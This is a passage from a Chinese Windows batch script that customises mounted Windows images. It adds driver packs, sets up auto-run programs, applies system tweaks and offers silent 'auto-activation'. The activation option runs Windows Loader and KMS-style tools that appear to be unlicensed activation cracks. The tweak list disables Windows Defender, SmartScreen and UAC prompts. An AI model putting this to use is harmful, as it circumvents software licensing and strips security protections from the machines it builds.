	echo. && echo.挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回... && pause>nul && goto :input4
)

:E3RAID
cls&title 整合E3_RAID&set "Item=整合E3_RAID"
if /i "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /image:"Mount" /add-driver /driver:"File\RAID\x!Bit!\E3_RAID" /Recurse
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回... && pause>nul && goto :input4
)

:KabyLakeRAID
cls&title 整合KabyLake_RAID&set "Item=整合KabyLake_RAID"
if /i "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /image:"Mount" /add-driver /driver:"File\RAID\x!Bit!\KabyLake_RAID" /Recurse
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回... && pause>nul && goto :input4
)

:DrvCeonw
cls&mode con cols=80 lines=30&title 整合驱动总裁网卡版 
set "AppPath="
set "Item="
echo.         
echo.    _____________________________ 整合驱动总裁 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[1]:将驱动总裁网卡版保存在映像内，进桌面前自动安装网卡驱动。首次 ^|
echo.   ^|                                                                        ^|
echo.   ^|   联网后，则会再次调用安装其他驱动。                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[2]:系统部署时会自动查找C盘之外的所有磁盘根目录，如查找到与系统  ^|
echo.   ^|                                                                        ^|
echo.   ^|   匹配的驱动总裁会自动解压并调用，调用格式支持.iso .zip .7z .rar。     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 驱动总裁内置                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 驱动总裁外置                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :input4
if errorlevel 2 goto :DrvCeonwOut
if errorlevel 1 goto :DrvCeonwIn

:DrvCeonwIn
if /i "!Version:~0,1!"=="8" cls && echo. && echo.已挂载的系统是 Windows !Version! x!Bit!，没有此版本的驱动总裁。 && echo. && echo.请按任意键返回... && pause>nul && goto :input4
cls&set "Item=整合驱动总裁-内置"
set "DrvCeonw="
set "DrvCeonw=!ScriptsLog!\DrvCeonwIn.log"
set "AppPath=File\Driver\DrvCeonw.7z"
if exist "!AppPath!" (
	"!ToolsPath!\7z.exe" -y x "!AppPath!" "Win!Version!x!Bit!" "Res" "PESRS\DCWin!Version!x!Bit!" "DrvCeox!Bit!.exe" "uninstall.bat" "Drvceo.ini" -o"Mount\Windows\Driver\DrvCeonw" >nul 2>nul
	echo "%%WinDir%%\Driver\DrvCeonw\DrvCeox!bit!.exe" ^&^& goto :Next > "!DrvCeonw!"
	echo @echo off > "Mount\Windows\DrvCeo.cmd"
	echo rd /s /q "%%ProgramFiles%%\SysCeo" >> "Mount\Windows\DrvCeo.cmd"
	echo :ping >> "Mount\Windows\DrvCeo.cmd"
	echo ping -n 3 www.baidu.com^|findstr "TTL=" ^>nul 2^>nul^|^|ping -n 10 127.0.0.1^>nul^&^&goto :ping >> "Mount\Windows\DrvCeo.cmd"
	echo tasklist^|find /i "DrvCeox64.exe" ^>nul 2^>nul^|^|start "" "%%WinDir%%\Driver\DrvCeonw\DrvCeox!bit!.exe" -a >> "Mount\Windows\DrvCeo.cmd"
	echo del /f /q %%0 >> "Mount\Windows\DrvCeo.cmd"
) else (
	call :AppPath
)
if exist "Mount\Windows\Driver\DrvCeonw\DrvCeox!Bit!.exe" (
	if exist "!ScriptsLog!\DrvCeonwIn.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:DrvCeonwOut
if /i "!Version:~0,1!"=="8" ( cls && echo. && echo.已挂载的系统是 Windows !Version! x!Bit!，没有此版本的驱动总裁。 && echo. && echo.请按任意键返回... && pause>nul && goto :input4 )
cls&set "Item=整合驱动总裁-外置"
set "DrvCeonw="
set "DrvCeonw=!ScriptsLog!\DrvCeonwOut.log"
set "AppPath=File\Driver\DrvCeonw.7z"
if exist "!AppPath!" (
	"!ToolsPath!\7z.exe" -y x "!AppPath!" "Drvceo.ini" -o""!Scripts!"" >nul 2>nul
	echo FOR %%%%a in ^(D E F G H I J K L M N O P Q R S T U V W X Y Z^) do ^(FOR %%%%i in ^("%%%%a:\*.*"^) do ^(echo %%%%~xi^|findstr /i ".iso .zip .7z .rar" ^&^& 7z l "%%%%i" "DrvCeox!Bit!.exe"^|findstr /i "DrvCeox!Bit!.exe" ^&^& 7z -y x "%%%%i" -o"%%%%~dpni" ^&^& copy /v /y "%%~dp0Drvceo.ini" "%%%%~dpni" ^&^& "%%%%~dpni\DrvCeox!Bit!.exe" -d ^&^& call "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat" ^&^& rd /s /q "%%ProgramFiles%%\SysCeo" ^&^& goto :Next^)^) > "!DrvCeonw!"
) else (
	call :AppPath
)
if exist "!Scripts!\Drvceo.ini" (
	if exist "!ScriptsLog!\DrvCeonwOut.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:EasyDrv
cls&mode con cols=80 lines=30&title 整合万能驱动
set "AppPath="
set "Item="
echo.
echo.    _____________________________ 整合万能驱动 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[1]:将万能驱动会保存在映像内，会增加映像体积。                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[2]:系统部署时会自动查找C盘之外的所有磁盘根目录，如查找到与系统  ^|
echo.   ^|                                                                        ^|
echo.   ^|   匹配的万能驱动则会自动解压并调用，调用格式支持.iso .zip .7z .rar。   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 万能驱动内置                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 万能驱动外置                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :input4
if errorlevel 2 goto :EasyDrvOut
if errorlevel 1 goto :EasyDrvIn

:EasyDrvIn
if /i "!Version:~0,1!"=="8" ( cls && echo. && echo.已挂载的系统是 Windows !Version! x!Bit!，没有此版本的万能驱动。 && echo. && echo.请按任意键返回... && pause>nul && goto :input4 )
cls&set "Item=整合万能驱动-内置"
set "EasyDrv="
set "EasyDrv=!ScriptsLog!\EasyDrvIn.log"
set "AppPath=File\Driver\EasyDrv7_Win!Version!.x!Bit!*.*"

if exist "!AppPath!" (
	"!ToolsPath!\7z.exe" -y x "!AppPath!" -pitsk.com -o"Mount\Windows\Driver\EasyDrv7_Win!Version!.x!Bit!"
	echo "%%WinDir%%\Driver\EasyDrv7_Win!Version!.x!Bit!\EasyDrv7(Win!Version!.x!Bit!).exe" /a /c ^&^& reg delete "HKLM\SOFTWARE\EasyDrv7" /f ^&^& rd /s /q %%WinDir%%\Driver\EasyDrv7_Win!Version!.x!Bit! ^&^& goto :Next > "!EasyDrv!"
) else (
	cls&&echo.&&echo.请先将适用于Windows!Version! x!Bit!的万能驱动放入本工具的"File\Driver"文件夹内。&&echo.&&echo.文件名称与官网的一致，格式支持.ISO.7Z.ZIP.RAR。&&echo.&&echo.请按任意键返回...&&pause>nul&&goto :EasyDrv
)
if exist "Mount\Windows\Driver\EasyDrv7_Win!Version!.x!Bit!\EasyDrv7(Win!Version!.x!Bit!).exe" (
	if exist "!EasyDrv!" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:EasyDrvOut
if /i "!Version:~0,1!"=="8" ( cls && echo. && echo.已挂载的系统是 Windows !Version! x!Bit!，没有此版本的万能驱动。 && echo. && echo.请按任意键返回... && pause>nul && goto :input4 )
cls&set "Item=整合万能驱动-外置"
set "EasyDrv="
set "EasyDrv=!ScriptsLog!\EasyDrvOut.log"
echo FOR %%%%a in ^(D E F G H I J K L M N O P Q R S T U V W X Y Z^) do ^(FOR %%%%i in ^("%%%%a:\*.*"^) do ^(echo %%%%~xi^|findstr /i ".iso .zip .7z .rar" ^&^& 7z l "%%%%i" "EasyDrv7(Win!Version!.x!Bit!).exe"^|findstr /i "EasyDrv7(Win!Version!.x!Bit!).exe" ^&^& 7z -y x "%%%%i" -o"%%%%~dpni" ^&^& "%%%%~dpni\EasyDrv7(Win!Version!.x!Bit!).exe" /a /c ^&^& reg delete "HKLM\SOFTWARE\EasyDrv7" /f ^&^& goto :Next^)^) > "!EasyDrv!"
if exist "!EasyDrv!" ( call :Log & call :Achiexe ) else ( call :Failure )

:AppleDrive
cls&mode con cols=80 lines=30&title 整合苹果驱动
set "AppPath="
set "Item=整合苹果驱动"
set "goto=input4"
echo.
echo.    _____________________________ 整合苹果驱动 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   此选项可以整合全系列苹果电脑关键驱动，例如网卡，触控板，键盘等...    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 整合苹果驱动                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 2 goto :input4
if not exist "File\AppleDrive\Win!Version!" cls&&echo.&&echo.没有此版本的苹果驱动，请挂载Windows7或windows10，请按任意键返回...&&pause>nul&&goto :input4
cls&&echo.&&echo.正在整合苹果驱动中，请稍等...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
"!Dism!" /image:"Mount" /add-driver /driver:"File\AppleDrive\Win!Version!" /Recurse /ForceUnsigned
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
call :Log & call :Achiexe

:input5
cls&mode con cols=80 lines=30&title 整合自动激活
set "AppPath="
set "Item=整合自动激活"
set "goto=menu3"
echo.
echo.    _____________________________ 整合自动激活 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows_7 磁盘MBR分区永久激活，GPT分区请手动激活。                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows_8 为KMS激活半年，自动续期。                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows10 永久激活，登陆微软后微软官网可查询授权设备。               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 添加自动激活                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 2 goto :menu3
if errorlevel 1 goto :activation

:activation
cls&set "Copy="&set "activation="
if /i "!Version!"=="7" (
	set "AppPath=File\activation\activation.7z"
	set "Copy="!ToolsPath!\7z.exe" -y x "!AppPath!" "Windows_Loader_2.2.2_Final.7z" -o"!Scripts!""
	set "activation=7z -y x "%%~dp0Windows_Loader_2.2.2_Final.7z" -o"%%~dp0"&&"%%~dp0WindowsLoader.exe" /silent /preactivate"
)
if /i "!Version!"=="10" (
	set "AppPath=File\activation\activation.7z"
	set "Copy="!ToolsPath!\7z.exe" -y x "!AppPath!" "activation_x!Bit!" -o"!Scripts!""
	set "activation=call %%~dp0activation_x!Bit!\activation.cmd"
)
if  /i "!Version:~0,1!"=="8" (
	set "AppPath=File\activation\activation.7z"
	set "Copy="!ToolsPath!\7z.exe" -y x "!AppPath!" "bin" "OOBE.cmd" -o"!Scripts!""
	set "activation=::"
)
if exist "!AppPath!" (
	!Copy! >nul 2>nul
	echo !activation! > "!ScriptsLog!\activation.log"
) else (
	call :AppPath
)
if exist "!AppPath!" (
	if exist "!ScriptsLog!\activation.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:input6
cls&mode con cols=80 lines=30&title 整合自动运行其他应用程序
set "Item="
set "goto="
if not exist "[App]" md "[App]" >nul 2>nul
echo.
echo.    _________________________ 自动运行其他应用程序 _________________________
echo.   ^|                         ----------------------                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   支持.exe .cmd .bat .vbs文件，支持运行参数。                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   请先将要运行的文件或文件夹放入本工具的[App]文件夹内。                ^|
echo.   ^|                                                                        ^|
echo.   ^|   然后在下面光标处输入"程序名|参数",无需输入路径,请参考下行的例子。    ^|
echo.   ^|                                                                        ^|
echo.   ^|   无参数:QQ.exe 有参数:QQ.exe^|/S（若有参数，参数前的^|号是必要的！）    ^|
echo.   ^|                                                                        ^|
echo.   ^|   输入的程序名称需与放在[App]文件夹内对应程序名称一致！                ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回请输入 X 然后回车。                                          ^|
echo.   ^|                                                                        ^|
echo.
set "SourceApp="
set /p SourceApp=^>^>^>^>^>^>^>请输入：
if not defined SourceApp cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :input6
set "SourceApp=!SourceApp:"=!"
if not defined SourceApp cls && echo. && echo.您的输入格式不正确，，请按任意键返回重新输入... && pause>nul && goto :input6
if /i "!SourceApp!" equ "x" goto :menu3
set "AppName="
set "AppParameter="
set "SourceAppPath="
set "SourceAppFolder="
set "Copy="
for /f "tokens=1,2 delims=|" %%a in ("!SourceApp!") do (set "AppName=%%a"&set "AppParameter=%%b")
echo .exe.cmd.vbs.bat|find /i "!AppName:~-4!" >nul 2>nul||(cls&&echo.&&echo.您的输入"!SourceApp!"不是合格的文件名称，请按任意键返回重新输入...&&pause>nul&&goto :input6)
echo .exe.cmd.vbs.bat|find /i "!AppName!" >nul 2>nul&&(cls&&echo.&&echo.您的输入"!SourceApp!"不是合格的文件名称，请按任意键返回重新输入...&&pause>nul&&goto :input6)
for /f %%i in ('dir /a-d /b /s "[App]\!AppName!"') do (set "SourceAppPath=%%~dpi"&set "AppName=%%~nxi")
if not exist "!SourceAppPath!!AppName!" cls&&echo.&&echo.本工具的[App]文件夹内未发现"!AppName!"文件或文件夹。&&echo.&&echo.你需要先把"!AppName!"文件或文件夹放入[App]文件夹内。&&echo.&&echo.请按任意键返回...&&start "" explorer.exe "[App]"&&pause>nul&&goto :input6 )
if not defined AppParameter (set "AppParameter=") else (set "AppParameter= !AppParameter!")
for /f "tokens=2 delims=[" %%a in ("!SourceAppPath!") do set "SourceAppPath=[%%a"
if /i "!SourceAppPath!" equ "[App]\" (
	set "SourceAppPath="&set "Copy=copy /v /y "[App]\!AppName!"" 
) else (
	for /f "tokens=2 delims=\" %%a in ("!SourceAppPath!") do set "Copy="!ToolsPath!\PECMD.EXE" FILE "[App]\%%a\"=^>"
	set "SourceAppPath=!SourceAppPath:[App]\=!"
)

:AppSet
cls&mode con cols=80 lines=30&title !AppName!设置
set "goto=input6"
set "TargetAppPath="
set "Run="
set "FilePath="
echo.
echo.    ____________________________ 程序运行设置 ______________________________
echo.   ^|                            --------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   如果没有或不确定程序的静默参数是否正确，请选首次进桌面后执行，以免   ^|
echo.   ^|                                                                        ^|
echo.   ^|   软件不能自动化安装而停在软件安装界面。                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 首次进桌面前运行，只运行一次，运行完自动清除。                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 首次进桌面后运行，只运行一次，运行完自动清除。                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 每次进桌面后运行，每次启动都运行。                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 4 goto :input6
if errorlevel 3 goto :AppAfter
if errorlevel 2 goto :AppAfterOnce
if errorlevel 1 goto :AppBefore
:AppBefore
set "Item=整合首次进桌面前运行"!AppName!!AppParameter!""
set "TargetAppPath=!Scripts!"
set "Run="
goto :AppNext
:AppAfterOnce
set "Item=整合首次进桌面后运行"!AppName!!AppParameter!"，只运行一次"
set "TargetAppPath=!Sysprep!"
set "Run=RunOnce"
set "FilePath=Sysprep"
goto :AppNext
:Appafter
set "Item=整合进桌面后运行"!AppName!!AppParameter!"，每次启动都运行"
set "TargetAppPath=Mount\Windows\RunApp"
set "Run=Run"
set "FilePath=RunApp"
if not exist "!TargetAppPath!" md "!TargetAppPath!" >nul 2>nul
:AppNext
cls
!Copy! "!TargetAppPath!\" >nul 2>nul
if "!Run!" equ "" (
	if not exist "!ScriptsLog!\App" md "!ScriptsLog!\App" >nul 2>nul
	echo "!ScriptsPath!\!SourceAppPath!!AppName!"!AppParameter!>"!ScriptsLog!\APP\!AppName:~0,-4!.log"
) else (
	echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\!Run!" /v "!AppName:~0,10!" /t REG_SZ /d "\"!windir!\!FilePath!\!SourceAppPath!!AppName!\"!AppParameter!" /f>>"!ScriptsLog!\AppAfter.log"
)
if exist "!TargetAppPath!\!SourceAppPath!!AppName!" ( call :Log & call :Achiexe ) else ( call :Failure )

:input7
cls&mode con cols=80 lines=44&title 优化系统
set "AppPath="
set "Item=优化Windows!Version!_x!Bit!"
set "goto=menu3"
echo.
echo.    _______________________________ 优化系统 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***桌面图标，任务栏，以及开始菜单优化***                             ^|
if /i "!Version!"=="7" (
echo.   ^|                                                                        ^|
echo.   ^|   在桌面显示计算机                                                     ^|
)
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   在桌面显示此电脑                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   在桌面显示控制面板                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   将任务栏中的Cortana调整为仅显示图标                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   任务栏时钟精确到秒                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   移除任务栏邮箱按钮                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   显示开始菜单、任务栏、操作中心和标题栏的颜色                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   使开始菜单、任务栏、操作中心透明                                     ^|
)
if  /i "!Version:~0,1!"=="8" (
echo.   ^|                                                                        ^|
echo.   ^|   在桌面显示此电脑                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   在桌面显示控制面板                                                   ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   当任务栏被占满时始终合并                                             ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   隐藏任务栏上的人脉按钮                                               ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   语言栏隐藏到任务拦                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   取消语言栏上的帮助按钮                                               ^|
if /i "!Version!"=="7" (
echo.   ^|                                                                        ^|
echo.   ^|   开启Win7 Aero主题                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   开启DWM中的透明果                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭开始菜单"突出显示新安装的程序"                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   开始菜单显示运行                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   取消游戏里"下载有关已安装游戏的技巧和信息"和"收集最近玩过的游戏信息" ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***资源管理器优化***                                                 ^|
)
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   不允许在开始菜单显示建议                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭在应用商店中查找关联应用                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭偶尔在开始菜单中显示的推荐应用                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭Windows Ink推广应用                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭锁屏时的Windows 聚焦推广                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭"使用Windows时获取技巧和建议"                                    ^|
if /i "!Version!"=="10" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   关闭"突出显示新安装的程序"                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁止自动安装推荐的应用程序                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭游戏录制工具                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭"当我玩游戏时在后台录制"，开启此功能会影响游戏质量               ^|
echo.   ^|                                                                        ^|
echo.   ^|   登陆界面默认打开小键盘                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭OneDrive                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭自动更新地图                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   显示首次登录动画                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***资源管理器优化***                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   打开资源管理器时显示此电脑                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   隐藏此电脑中视频、图片、文档、下载、音乐、桌面、3D对象七个文件夹     ^|
)
if  /i "!Version:~0,1!"=="8" (
echo.   ^|                                                                        ^|
echo.   ^|   关闭在应用商店中查找关联应用                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭“突出显示新安装的程序”                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   登陆界面默认打开小键盘                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   显示首次登录动画                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***资源管理器优化***                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   打开资源管理器时显示此电脑                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   隐藏此电脑中视频、图片、文档、下载、音乐、桌面六个文件夹             ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   显示所有文件扩展名                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   隐藏快捷方式小箭头                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   隐藏可执行文件小盾牌                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   隐藏NTFS蓝色双箭头压缩标识                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   创建快捷方式时不添快捷方式文字                                       ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   禁止自动播放                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   在单独的进程中打开文件夹窗口                                         ^|
if /i "!Version!"=="7" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   资源管理器窗口最小化时显示完整路径                                   ^|
if /i "!Version!"=="10" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   关闭视频文件预览，提高资源管理器响应速度                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭音乐文件图片预览，提高资源管理器响应速度                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   资源管理器快速访问不显示常用文件夹                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   资源管理器快速访问不显示最近使用的文件                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***安全设置优化***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   将用户账号控制程序（UAC）调整为从不通知                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   开启用于内置管理员帐户的管理员批准模式                               ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   关闭Smartscreen应用筛选器                                            ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   关闭打开程序的安全警告                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁用Windows Defender                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***浏览器优化***                                                     ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   Edge浏览器,阻止Microsoft Edge"首次运行"欢迎页面                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   Edge浏览器,关闭Adobe Flash即点即用                                   ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,关闭多个选项卡时不发出警告                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,当创建新选项卡时，始终切换到新选项卡                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,其他程序从当前窗口的新选项卡打开连接                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,以兼容性视图中显示所有网站                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,启用表单的自动完成功能                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,关闭建议的网站                                              ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,跳过IE首次运行自定义设置                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,不保存附件的区域信息                                        ^|
if /i "!Version!"=="7" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,启用Internet Explorer增强保护模式                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,针对增强保护模式启用64位进程                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,锁定Internet Explorer工具栏                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,将同时可用下载数目调整到 10                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,遇到弹出窗口时始终在新选项卡中打开弹出窗口                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   IE浏览器,关闭IE自动更新                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***服务优化***                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭程序兼容性助手                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁用错误报告                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁用家庭组                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁用客户体验改善计划                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***系统性能优化***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化硬盘数据存储 -                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   加快Aero Snap显示速度，更快的看到窗口缩略图                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   加快Aero Peek透视桌面功能的显示速度                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   提高前台程序的响应速度                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   加快系统各内存命令的显示反应速度                                     ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   优化程序的反应时间，加快系统处理速度。                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   缩短因错误程序导致鼠标键盘无反应的等待时间                           ^|
if /i "!Version!"=="7" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   自动关闭无反应的程序，避免系统的"死机"隐患                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化内存配置，加速游戏等软件的运行速度                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化处理器的资源分配，看电影视频更流畅                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁止远程修改注册表                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***界面效果优化***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化程序进程，独立进程优先级，避免系统"死机"                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化用户界面组件，当发生异常后自动刷新，防止系统"死机" -             ^|
echo.   ^|                                                                        ^|
echo.   ^|   加快任务栏窗口预览显示速度                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***文件系统优化***                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化Windows文件列表刷新策略                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化磁盘访问性能，提升磁盘数据的读写能力                             ^|
echo.   ^|                                                                        ^|
